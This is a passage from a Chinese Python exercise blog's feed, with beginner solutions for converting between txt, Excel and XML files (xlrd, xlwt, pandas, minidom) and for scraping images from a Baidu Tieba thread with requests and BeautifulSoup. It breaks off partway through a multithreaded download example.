    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：</code></pre><a id="more"></a><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;&lt;students&gt;&lt;!--     学生信息表    &quot;id&quot; : [名字, 数学, 语文, 英文]--&gt;{    &quot;1&quot; : [&quot;张三&quot;, 150, 120, 100],    &quot;2&quot; : [&quot;李四&quot;, 90, 99, 95],    &quot;3&quot; : [&quot;王五&quot;, 60, 66, 68]}&lt;/students&gt;&lt;/root&gt;</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先用<a href="https://github.com/python-excel/xlrd" target="_blank" rel="noopener">xlrd</a>读取xls表格里的数据，接着去按照指定格式写入到xml文件，这里我们用<a href="https://docs.python.org/3/library/xml.dom.minidom.html#module-xml.dom.minidom" target="_blank" rel="noopener">xml.dom.minidom</a>去操作xml对象。</p><blockquote><p>pip install xlrd</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.dom.minidom <span class="keyword">as</span> md</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取xml内容到字典对象</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_xls</span><span class="params">(filename, sheetname)</span>:</span></span><br><span class="line">    <span class="comment">#打开student.xls</span></span><br><span class="line">    xls = xlrd.open_workbook(filename)</span><br><span class="line">    <span class="comment">#读取student表</span></span><br><span class="line">    sheet = xls.sheet_by_name(sheetname)</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="comment"># 获取每行内容，以row为键，后面的列表为值，放到字典</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(sheet.nrows):</span><br><span class="line">        row_d = sheet.row_values(n)</span><br><span class="line">        data[row_d[<span class="number">0</span>]] = list(row_d[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#按照题目要求美化字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pretty_str</span><span class="params">(dicts)</span>:</span></span><br><span class="line">    text = <span class="string">""</span>.join(<span class="string">'&#123;\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> sorted(dicts.keys()):</span><br><span class="line">        lists = dicts[k]</span><br><span class="line">        s = <span class="string">'\t\t\t"%s" : ["%s", %d, %d, %d],\n'</span> % (</span><br><span class="line">            int(k), lists[<span class="number">0</span>], int(lists[<span class="number">1</span>]), int(lists[<span class="number">2</span>]), int(lists[<span class="number">3</span>]))</span><br><span class="line">        text += s</span><br><span class="line">    text += <span class="string">'\t\t&#125;'</span></span><br><span class="line">    text = text[::<span class="number">-1</span>].replace(<span class="string">','</span>, <span class="string">''</span>, <span class="number">1</span>)[::<span class="number">-1</span>]  <span class="comment">#处理列表最后一项后面的，</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入到xml</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_xml</span><span class="params">(xmlname, data, comment)</span>:</span></span><br><span class="line">    <span class="comment">#新建xml文档对象</span></span><br><span class="line">    xml = md.Document()</span><br><span class="line">    <span class="comment">#创建根节点</span></span><br><span class="line">    root = xml.createElement(<span class="string">'root'</span>)</span><br><span class="line">    <span class="comment">#创建student节点</span></span><br><span class="line">    child = xml.createElement(xmlname)</span><br><span class="line">    <span class="comment">#先加入root节点</span></span><br><span class="line">    xml.appendChild(root)</span><br><span class="line">    <span class="comment">#在root节点下加入student节点</span></span><br><span class="line">    root.appendChild(child)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#在student节点下添加注释</span></span><br><span class="line">    comment = xml.createComment(comment)</span><br><span class="line">    child.appendChild(comment)</span><br><span class="line">    <span class="comment">#在student节点下写入文字内容</span></span><br><span class="line">    xmlcontent = xml.createTextNode(data)</span><br><span class="line">    child.appendChild(xmlcontent)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#美化后，保存到student.xml,"会被转义为＆quot，这里我们替换回来</span></span><br><span class="line">    <span class="keyword">with</span> open(xmlname + <span class="string">'.xml'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(xml.toprettyxml().replace(<span class="string">'&amp;quot;'</span>, <span class="string">'"'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    comment = <span class="string">'学生信息表 "id" : [名字, 数学, 语文, 英文]'</span></span><br><span class="line">    data = read_xls(<span class="string">'student.xls'</span>, <span class="string">'student'</span>)</span><br><span class="line">    data = pretty_str(data)</span><br><span class="line">    write_xml(<span class="string">'student'</span>, data, comment)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://wenqiang-china.github.io/2016/05/13/python-opetating-excel/" target="_blank" rel="noopener">https://wenqiang-china.github.io/2016/05/13/python-opetating-excel/</a></li><li><a href="https://www.cnblogs.com/liez/p/5406621.html" target="_blank" rel="noopener">https://www.cnblogs.com/liez/p/5406621.html</a></li><li><a href="https://maoao530.github.io/2016/08/10/python-show-me-the-code/" target="_blank" rel="noopener">https://maoao530.github.io/2016/08/10/python-show-me-the-code/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;将 第 0014 题中的 student.xls 文件中的内容写到 student.xml 文件中，如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0016</title>
    <link href="https://xiaotaoist.github.io/2018/06/09/python-exercise-0016/"/>
    <id>https://xiaotaoist.github.io/2018/06/09/python-exercise-0016/</id>
    <published>2018-06-09T05:37:13.000Z</published>
    <updated>2018-06-09T06:28:46.239Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示：</code></pre><a id="more"></a><blockquote><p>[<br>    [1, 82, 65535],<br>    [20, 90, 13],<br>    [26, 809, 1024]<br>]<br>请将上述内容写到 numbers.xls 文件中，如下图所示：<br><img src="https://camo.githubusercontent.com/60da4d596289212b517547ddcc2408bfc9f39087/687474703a2f2f692e696d6775722e636f6d2f69757a305062762e706e67" alt="0016"></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>和<a href="https://xiaotaoist.github.io/2018/06/07/python-exercise-0014/">0014题</a>,<a href="https://xiaotaoist.github.io/2018/06/08/python-exercise-0015/">0015题</a>一样，还是将指定内容写入Excel表格，这次我们分别用<code>xlwt</code>和<code>pandas</code>。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>xlwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="comment">#格式化成json数据便于操作</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(filename, data)</span>:</span></span><br><span class="line">    <span class="comment">#新建一个xls表格</span></span><br><span class="line">    workbook = xlwt.Workbook()</span><br><span class="line">    <span class="comment">#新建表：numbers</span></span><br><span class="line">    sheet_name = workbook.add_sheet(<span class="string">'numbers'</span>)</span><br><span class="line">    row = <span class="number">0</span>  <span class="comment">#行</span></span><br><span class="line">    <span class="comment">#data 的内容[[1, 82, 65535], [20, 90, 13], [26, 809, 1024]]</span></span><br><span class="line">    <span class="keyword">for</span> row_d <span class="keyword">in</span> data:</span><br><span class="line">        col = <span class="number">0</span>  <span class="comment">#列</span></span><br><span class="line">        <span class="keyword">for</span> col_d <span class="keyword">in</span> row_d:</span><br><span class="line">            sheet_name.write(row, col, col_d)</span><br><span class="line">            col += <span class="number">1</span></span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    <span class="comment">#保存成numbers.xls表</span></span><br><span class="line">    workbook.save(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    data = read(<span class="string">'numbers.txt'</span>)</span><br><span class="line">    write(<span class="string">'numbers.xls'</span>, data)</span><br></pre></td></tr></table></figure></li><li><p>pandas</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df =pd.read_json(<span class="string">'numbers.txt'</span>)  </span><br><span class="line">df.to_excel(<span class="string">'numbers.xls'</span>,header=<span class="keyword">None</span>,index=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/brucewong0516/article/details/79097909" target="_blank" rel="noopener">https://blog.csdn.net/brucewong0516/article/details/79097909</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;纯文本文件 numbers.txt, 里面的内容（包括方括号）如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0015</title>
    <link href="https://xiaotaoist.github.io/2018/06/08/python-exercise-0015/"/>
    <id>https://xiaotaoist.github.io/2018/06/08/python-exercise-0015/</id>
    <published>2018-06-08T04:16:13.000Z</published>
    <updated>2018-06-08T05:09:09.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示：</code></pre><a id="more"></a><blockquote><p>{<br>    “1” : “上海”,<br>    “2” : “北京”,<br>    “3” : “成都”<br>}<br>请将上述内容写到 city.xls 文件中，如下图所示：<br><img src="https://camo.githubusercontent.com/61120377319bfe5520c9d73f51776f923d6bd3b7/687474703a2f2f692e696d6775722e636f6d2f724f4862557a672e706e67" alt="0015"></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>和<a href="https://xiaotaoist.github.io/2018/06/07/python-exercise-0014/">0014题</a>一样也是将指定内容写入Excel表格，这次我们用<a href="https://github.com/python-excel/xlwt" target="_blank" rel="noopener">xlwt库</a></p><blockquote><p>pip install xlwt</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="comment">#格式化成json数据便于操作</span></span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(filename, data)</span>:</span></span><br><span class="line">    <span class="comment">#新建一个xls表格</span></span><br><span class="line">    workbook = xlwt.Workbook()</span><br><span class="line">    <span class="comment">#添加一个city表</span></span><br><span class="line">    sheet_name = workbook.add_sheet(<span class="string">'city'</span>)</span><br><span class="line">    row = <span class="number">0</span> <span class="comment">#行</span></span><br><span class="line">    <span class="comment">#data 的内容[('1', '上海'), ('2', '北京'), ('3', '成都')]</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> data.items():</span><br><span class="line">        col = <span class="number">0</span> <span class="comment">#列</span></span><br><span class="line">        sheet_name.write(row, col, i)</span><br><span class="line">        sheet_name.write(row, col + <span class="number">1</span>, j)</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    <span class="comment">#保存成city.xls表</span></span><br><span class="line">    workbook.save(filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    data = read(<span class="string">'city.txt'</span>)</span><br><span class="line">    write(<span class="string">'city.xls'</span>, data)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.jianshu.com/p/4e39444d5ebc" target="_blank" rel="noopener">https://www.jianshu.com/p/4e39444d5ebc</a></li><li><a href="https://blog.csdn.net/tongxinzhazha/article/details/78796952" target="_blank" rel="noopener">https://blog.csdn.net/tongxinzhazha/article/details/78796952</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;纯文本文件 city.txt为城市信息, 里面的内容（包括花括号）如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0014</title>
    <link href="https://xiaotaoist.github.io/2018/06/07/python-exercise-0014/"/>
    <id>https://xiaotaoist.github.io/2018/06/07/python-exercise-0014/</id>
    <published>2018-06-07T00:27:13.000Z</published>
    <updated>2018-06-08T04:34:32.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示：</code></pre><a id="more"></a><blockquote><p>{<br>    “1”:[“张三”,150,120,100],<br>    “2”:[“李四”,90,99,95],<br>    “3”:[“王五”,60,66,68]<br>}<br>请将上述内容写到 student.xls 文件中，如下图所示：<br><img src="https://camo.githubusercontent.com/18dea9401449e4ca894d40d55134d9c28083280d/687474703a2f2f692e696d6775722e636f6d2f6e50446c706d652e6a7067" alt="0014"></p></blockquote><p><a href="https://www.cnblogs.com/skynet/archive/2013/05/06/3063245.html" target="_blank" rel="noopener">阅读资料</a> 腾讯游戏开发 XML 和 Excel 内容相互转换</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>txt的内容格式其实是字典格式，这里我们可以使用强大的数据处理库<a href="https://pandas.pydata.org/pandas-docs/stable/" target="_blank" rel="noopener">pandas</a>实现字典到excel的直接转化。</p><blockquote><p>pip install pandas xlwt</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#按json格式读取内容，转化成pandas可以处理的DataFrame格式</span></span><br><span class="line">df = pd.read_json(<span class="string">'student.txt'</span>,orient=<span class="string">'index'</span>)</span><br><span class="line"><span class="comment">#printf(df)</span></span><br><span class="line"><span class="comment">#输出到student表格,表名student，忽略表头 0 1 2 3</span></span><br><span class="line">df.to_excel(<span class="string">'student.xls'</span>,sheet_name=<span class="string">'student'</span>,header=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_json.html" target="_blank" rel="noopener">https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_json.html</a></li><li><a href="https://blog.csdn.net/tongxinzhazha/article/details/78796952" target="_blank" rel="noopener">https://blog.csdn.net/tongxinzhazha/article/details/78796952</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;纯文本文件 student.txt为学生信息, 里面的内容（包括花括号）如下所示：
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python练习册" scheme="https://xiaotaoist.github.io/categories/Python%E7%BB%83%E4%B9%A0%E5%86%8C/"/>
    
    
      <category term="Python" scheme="https://xiaotaoist.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python练习册：0013</title>
    <link href="https://xiaotaoist.github.io/2018/06/06/python-exercise-0013/"/>
    <id>https://xiaotaoist.github.io/2018/06/06/python-exercise-0013/</id>
    <published>2018-06-05T23:45:13.000Z</published>
    <updated>2018-06-07T13:57:46.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code>用 Python 写一个爬图片的程序，爬 这个链接里的日本妹子图片 :-)</code></pre><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开<a href="http://tieba.baidu.com/p/2166231880" target="_blank" rel="noopener">链接</a>，F12，我们看到图片链接还是比较有规律的，可以用<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">Requests</a>获取网页，接着用<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">BeautifulSoup4</a>或<a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="noopener">正则</a>提取图片链接地址，然后下载到指定目录。</p><blockquote><p>pip install requests bs4 lxml</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li><p>使用正则提取图片链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#批量保存图片</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(urls,img_dir)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#新建存储位置</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(img_dir):</span><br><span class="line">        os.mkdir(img_dir)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#content的内容即为图片的二进制</span></span><br><span class="line">            img = requests.get(img_url,timeout=<span class="number">3</span>).content</span><br><span class="line">            imgname = img_url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">            filename = os.path.join(img_dir,imgname)</span><br><span class="line">            print(<span class="string">'downing ..... &#123;&#125;'</span>.format(imgname) )</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#保存图片</span></span><br><span class="line">            <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'downling &#123;&#125; fail !'</span>.format(filename) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img_dir = <span class="string">'img'</span></span><br><span class="line">    url = <span class="string">"http://tieba.baidu.com/p/2166231880"</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#正则提取 图片链接</span></span><br><span class="line">    img_urls = re.findall(<span class="string">r'pic_type="0" class="BDE_Image" src="(.*?)"'</span>,html.text)</span><br><span class="line">    </span><br><span class="line">    save_img(img_urls,img_dir)</span><br></pre></td></tr></table></figure></li><li><p>使用bs4库提取图片链接片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> BS</span><br><span class="line">url = <span class="string">"http://tieba.baidu.com/p/2166231880"</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建BeautifulSoup对象</span></span><br><span class="line">soup = BS(html.text,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#提取所有class="BDE_Image"的 img 标签</span></span><br><span class="line">img = soup(<span class="string">'img'</span>,&#123;<span class="string">'class'</span>:<span class="string">'BDE_Image'</span>&#125;)</span><br><span class="line">urls = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> img:</span><br><span class="line">    <span class="comment">#里面的src属性的内容即为我们所需要的链接</span></span><br><span class="line">    urls.append(i[<span class="string">'src'</span>])</span><br></pre></td></tr></table></figure></li></ul><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>当数据很多的时候，我们就需要考虑多线程/多进程/协程以提高运行速度。</p><ul><li><p><a href="https://docs.python.org/3/library/threading.html" target="_blank" rel="noopener">threading多线程</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(url,filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#content的内容即为图片的二进制</span></span><br><span class="line">        img = requests.get(url,timeout=<span class="number">3</span>).content       </span><br><span class="line">        print(<span class="string">'downing ..... &#123;&#125;'</span>.format(filename) )</span><br><span class="line"></span><br><span class="line">        <span class="comment">#保存图片</span></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(img)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_get</span><span class="params">(urls,img_dir)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(img_dir):os.mkdir(img_dir)</span><br><span class="line"></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        imgname = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        filename = os.path.join(img_dir,imgname)</span><br><span class="line">        <span class="comment">#绑定线程</span></span><br><span class="line">        t = threading.Thread(target=save_img,args=(url,filename))</span><br><span class="line">        